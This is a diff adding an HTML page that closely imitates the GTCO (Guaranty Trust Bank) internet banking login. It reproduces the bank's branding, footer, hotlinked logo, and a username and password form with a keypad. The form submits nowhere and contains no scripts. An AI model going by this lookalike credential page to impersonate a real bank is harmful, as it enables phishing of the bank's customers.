@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>GTCO Internet Banking</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #fff;
+    }
+    /* Header */
+    .header {
+      background: #f2f2f2;
+      padding: 15px;
+      border-bottom: 3px solid #ccc;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .header h2 {
+      margin: 0;
+      color: #333;
+      font-size: 18px;
+    }
+    .header img {
+      height: 40px;
+    }
+    /* Main Layout */
+    .main {
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 30px;
+      gap: 30px;
+      flex-wrap: wrap; /* allows responsive wrap */
+    }
+    /* Login Box */
+    .login-box {
+      background: #fff;
+      border: 1px solid #ddd;
+      padding: 20px;
+      width: 350px;
+      border-radius: 5px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      flex: 1;
+      min-width: 280px;
+      max-width: 400px;
+    }
+    .login-box h3 {
+      margin-top: 0;
+      color: #333;
+      font-size: 16px;
+      text-align: center;
+    }
+    .login-box p {
+      font-size: 13px;
+      color: #666;
+      text-align: center;
+    }
+    .login-box input {
+      width: 100%;
+      padding: 8px;
+      margin: 5px 0 15px 0;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+    }
+    /* Keypad */
+    .keypad {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin: 10px 0;
+    }
+    .keypad button {
+      padding: 10px;
+      background: #eee;
+      border: 1px solid #ccc;
+      cursor: pointer;
+    }
+    .keypad .clr, .keypad .del {
+      background: #ff6600;
+      color: #fff;
+      border: none;
+    }
+    .keypad .login {
+      background: green;
+      color: #fff;
+      border: none;
+    }
+    /* Right Banner */
+    .right-banner {
+      max-width: 300px;
+      flex: 1;
+      min-width: 260px;
+    }
+    .right-banner img {
+      width: 100%;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+    }
+    .fraud-box {
+      background: #f9f9f9;
+      padding: 15px;
+      border: 1px solid #ddd;
+    }
+    .fraud-box h4 {
+      margin: 0;
+      color: green;
+    }
+    .fraud-box p {
+      font-size: 13px;
+      margin: 10px 0;
+    }
+    /* Info Boxes */
+    .info-section {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      padding: 20px;
+      background: #f9f9f9;
+      flex-wrap: wrap;
+    }
+    .info-card {
+      flex: 1;
+      max-width: 250px;
+      background: #fff;
+      border: 1px solid #ddd;
+      padding: 15px;
+      text-align: center;
+      border-radius: 5px;
+      min-width: 200px;
+    }
+    .info-card h4 {
+      margin: 0;
+      color: #ff6600;
+    }
+    .info-card p {
+      font-size: 13px;
+      color: #333;
+    }
+    .info-card button {
+      padding: 6px 12px;
+      background: #333;
+      color: #fff;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+    /* Footer */
+    .footer {
+      background: #ff6600;
+      color: #fff;
+      text-align: center;
+      padding: 10px;
+      font-size: 12px;
+    }
+    /* Responsive Breakpoints */
+    @media (max-width: 768px) {
+      .main {
+        flex-direction: column;
+        align-items: center;
+      }
+      .right-banner {
+        max-width: 100%;
+      }
+      .login-box {
+        max-width: 100%;
+      }
+    }
+    @media (max-width: 480px) {
+      .header {
+        flex-direction: column;
+        text-align: center;
+      }
+      .header h2 {
+        margin-bottom: 10px;
+      }
+      .info-section {
+        flex-direction: column;
+        align-items: center;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <div class="header">
+    <h2>INTERNET BANKING</h2>
+    <img src="https://aonew.gtbank.com/SelfServiceApp_final/assets/img/GTCO.png" alt="GTCO Logo">
+  </div>
+
+  <!-- Main Section -->
+  <div class="main">
+    <!-- Login Box -->
+    <div class="login-box">
+      <h3>Online Realtime Balances and Transactions</h3>
+      <p>Kindly Login with any of <b>UserID, Account Number, Phone Number or Email</b> and use the keypad for your password.</p>
+
+      <label>UserId:</label>
+      <input type="text">
+
+      <label>Password:</label>
+      <input type="password">
+
+      <!-- Keypad -->
+      <div class="keypad">
+        <button>0</button><button>6</button><button>2</button>
+        <button>8</button><button>3</button><button>5</button>
+        <button>4</button><button>7</button><button>9</button>
+        <button class="clr">CLR</button>
+        <button class="del">DEL</button>
+        <button class="login">Login</button>
+      </div>
+
+      <p style="text-align:left;">
+        <a href="#" style="color:#ff6600; text-decoration:none;">Forgot your password?</a><br>
+        <a href="#" style="color:#ff6600; text-decoration:none;">Forgot your secret question?</a>
+      </p>
+
+      <p style="text-align:center; margin-top:15px;">
+        — New here? —<br>
+        <button style="margin-top:10px; padding:8px 16px; background:#ff6600; color:#fff; border:none; border-radius:3px; font-weight:bold;">Click to register</button>
+      </p>
+
+      <p>
+        <input type="checkbox" id="remember"> <label for="remember">Remember My UserID</label>
+      </p>
+    </div>
+
+    <!-- Right Banner -->
+    <div class="right-banner">
+      <img src="data:image/jpeg;base64,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" alt="GTWorld App">
+      <div class="fraud-box">
+        <h4>Suspect a fraudulent site?</h4>
+        <p>Please report to us by sending an email to <b style="color:#ff6600;">phishing@gtbank.com</b></p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Info Section -->
+  <div class="info-section">
+    <div class="info-card">
+      <h4>Security Tips</h4>
+      <p>GTBank will NEVER ask you to provide your PIN.</p>
+      <button>READ MORE</button>
+    </div>
+    <div class="info-card">
+      <h4>Do you have a token?</h4>
+      <p>Get a Token today and begin online payments.</p>
+      <button>GET YOURS</button>
+    </div>
+    <div class="info-card">
+      <h4>Account Transfers (Instant)</h4>
+      <p>The fastest way to transfer money to other bank accounts.</p>
+      <button>TRY IT TODAY</button>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    &copy; 2025 Guaranty Trust Bank Limited. RC 152321 | Licensed by the Central Bank of Nigeria. 
+    GTBANK.COM | PRIVACY POLICY | TERMS & CONDITIONS | WHISTLE BLOWER
+  </div>
+
+</body>
+</html>
